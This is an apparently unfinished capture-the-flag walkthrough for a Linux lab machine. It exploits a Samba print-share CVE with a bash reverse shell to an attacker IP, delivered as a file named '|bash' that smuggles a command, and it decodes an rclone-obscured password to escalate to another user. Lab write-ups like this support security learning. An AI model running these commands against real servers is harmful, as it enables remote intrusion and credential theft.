# ABDUCTED -- Linux

---
## Enumeration

---
#### NMAP
```
sudo nmap -Pn -sCV 10.129.244.177 --min-rate 6666 -vvv -oN tcp.nmap
```
<img width="613" height="637" alt="image" src="https://github.com/user-attachments/assets/cf47ef68-a3d4-4694-83ee-dcb619c6727a" />


---
#### NETEXEC

```
netexec smb 10.129.244.177 -u '' -p '' --shares
```
```
netexec smb 10.129.244.177 -u 'guest' -p '' --shares
```
<img width="1012" height="382" alt="image" src="https://github.com/user-attachments/assets/0d5cf26c-fe5e-4f7e-a8f3-43a61701ecd4" />

---
#### SMBCLIENT

```
smbclient //10.129.244.177/Hp-Reception
```

//confirms per netexec that we can write but not read

<img width="541" height="526" alt="image" src="https://github.com/user-attachments/assets/982918e7-140d-4ab0-a5ed-881a44aaca81" />


---
#### GOOGLE

```
samba smbd4 cve print
```

//try and see if we can find any CVEs since this seems to be the only attack surface

<img width="694" height="569" alt="image" src="https://github.com/user-attachments/assets/d091ee28-df81-4993-80fe-85d30bfe26ef" />


---
## Exploitation

---
#### CVE-2026-4480

//there are a few poc available on github but we can trivially pull this off manually

```
https://github.com/0xBlackash/CVE-2026-4480
```
```
https://github.com/CarlosEduardoPM/CVE-2026-4480-POC/blob/master/spffcor.py
```

//this one belongs to the box creator TheCyberGeek
```
https://github.com/TheCyberGeek/CVE-2026-4480-PoC/blob/main/exploit.py
```

- so apparently


1. first craft our bash rev shell payload -- name it accordingly
```
echo 'bash -i >& /dev/tcp/10.10.15.32/443 0>&1' > '|bash'
```
<img width="453" height="133" alt="image" src="https://github.com/user-attachments/assets/ec6d07e5-675f-401b-b03f-2b2e49041b50" />


2. fire up nc
```
rlwrap -cAr nc -lnvp 443
```

3. upload our payload in our smbclient session
```
put |bash
```
<img width="436" height="83" alt="image" src="https://github.com/user-attachments/assets/8eb73274-876d-4b8d-a95b-b777207efd82" />


4. and we got a rev shell back 

<img width="498" height="283" alt="image" src="https://github.com/user-attachments/assets/dcc4f9f9-1040-4f30-bd6b-845012934d06" />


//note that the good practice would be to try out the poc with simpler out of band technique first like a `ping` command


---

## PrivEsc

---

- enumerate and found a config file for rclone in `/opt`
- note that we found a potential cred `HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw` -- but could be some sort of a key or encrypted passwd

<img width="498" height="347" alt="image" src="https://github.com/user-attachments/assets/11177bdf-4659-4d78-85ee-67804e02ed42" />


- google `rclone` and apparently it's a cloud file management/backup program
- took awhile to finally find a way to decode or de-obscure the password via `reveal` at `https://github.com/rclone/rclone/issues/6718`
- apparently it's not listed in `help` command on purpose

```
rclone reveal HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
```

- and got `iXzvcib3SrpZ`

```
su scott
```

- and it works with user scott

<img width="609" height="161" alt="image" src="https://github.com/user-attachments/assets/c490a9bb-86eb-4d1c-95bd-e2349d31f4a8" />

- and finally got user.txt

<img width="416" height="306" alt="image" src="https://github.com/user-attachments/assets/4aa0139c-6ec9-4277-b60d-1374ec56ab46" />



---

TBC

















